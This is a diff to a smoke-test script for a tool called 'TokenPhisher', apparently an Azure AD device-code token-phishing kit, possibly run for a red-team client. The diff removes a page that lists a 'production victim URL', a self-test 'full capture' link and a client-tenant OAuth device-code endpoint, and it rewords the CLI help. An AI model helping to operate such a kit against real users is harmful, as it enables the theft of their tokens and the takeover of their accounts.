@@ -178,70 +178,6 @@ export async function runSmokeTests(config, { rootDir = __dirname } = {}) {
   };
 }
 
-export function renderSmokeTestPage(results, urls) {
-  const rows = results.checks
-    .map(
-      (item) =>
-        `<tr class="${item.ok ? 'ok' : 'fail'}"><td>${item.ok ? '✓' : '✗'}</td><td>${escapeHtml(item.label)}</td><td>${escapeHtml(item.detail)}</td></tr>`
-    )
-    .join('');
-
-  return `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>TokenPhisher Smoke Test</title>
-  <style>
-    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1a1a1a; }
-    h1 { font-size: 1.4rem; }
-    table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
-    td, th { border-bottom: 1px solid #ddd; padding: 0.5rem; text-align: left; vertical-align: top; }
-    tr.ok td:first-child { color: #0a7a2f; }
-    tr.fail td:first-child { color: #b00020; font-weight: bold; }
-    .card { background: #f6f8fa; border: 1px solid #d8dee4; border-radius: 8px; padding: 1rem; margin: 1rem 0; }
-    code, .mono { font-family: ui-monospace, monospace; font-size: 0.92rem; word-break: break-all; }
-    a { color: #0969da; }
-    .status { font-weight: 600; color: ${results.ok ? '#0a7a2f' : '#b00020'}; }
-  </style>
-</head>
-<body>
-  <h1>TokenPhisher smoke test</h1>
-  <p class="status">${results.ok ? 'All checks passed' : 'Some checks failed'}</p>
-
-  <table>
-    <thead><tr><th></th><th>Check</th><th>Detail</th></tr></thead>
-    <tbody>${rows}</tbody>
-  </table>
-
-  <div class="card">
-    <p><strong>Production victim URL</strong><br><a href="${escapeHtml(urls.victimUrl)}">${escapeHtml(urls.victimUrl)}</a></p>
-    <p><strong>Test full capture yourself</strong> (any Azure AD account you control — uses <code>/common/</code>, not the client tenant)<br>
-    <a href="${escapeHtml(urls.smokeTestUrl)}?capture=1">${escapeHtml(urls.smokeTestUrl)}?capture=1</a></p>
-  </div>
-
-  <div class="card">
-    <p><strong>Production OAuth</strong></p>
-    <p class="mono">${escapeHtml(results.configSummary.deviceCodeUrl)}</p>
-    ${results.production ? `<p>Sample code issued: <code>${escapeHtml(results.production.userCode)}</code> (diagnostic only — not polling)</p>` : ''}
-    <p>Full capture requires a user in tenant <code>${escapeHtml(results.configSummary.tenant || 'configured tenant')}</code>.</p>
-  </div>
-
-  <div class="card">
-    <p><strong>Refresh this page</strong> to re-run checks: <a href="${escapeHtml(urls.smokeTestUrl)}">${escapeHtml(urls.smokeTestUrl)}</a></p>
-  </div>
-</body>
-</html>`;
-}
-
-function escapeHtml(value) {
-  return String(value ?? '')
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
-}
-
 function pass(label, detail = '') {
   console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
 }
@@ -258,11 +194,13 @@ function loadConfig(configPath) {
 }
 
 function printHelp() {
-  console.log(`TokenPhisher smoke test
+  console.log(`TokenPhisher smoke test (CLI diagnostics)
 
 Usage:
   node smoke-test.mjs [options]
-  Or visit /smoke-test while the server is running.
+
+Checks config, TLS, and OAuth API without a browser login.
+For a real login test, visit /smoke-test while the server is running.
 
 Options:
   --config <file>     Config file (default: ./config.json)
@@ -316,7 +254,7 @@ async function main() {
 
   console.log(`\nSmoke test ${results.ok ? 'passed' : 'failed'}.`);
   if (config.tlsHostname) {
-    console.log(`Web UI: ${publicUrl(config, '/smoke-test')}`);
+    console.log(`Login test in browser: ${publicUrl(config, '/smoke-test')}`);
   }
 
   if (!results.ok) {
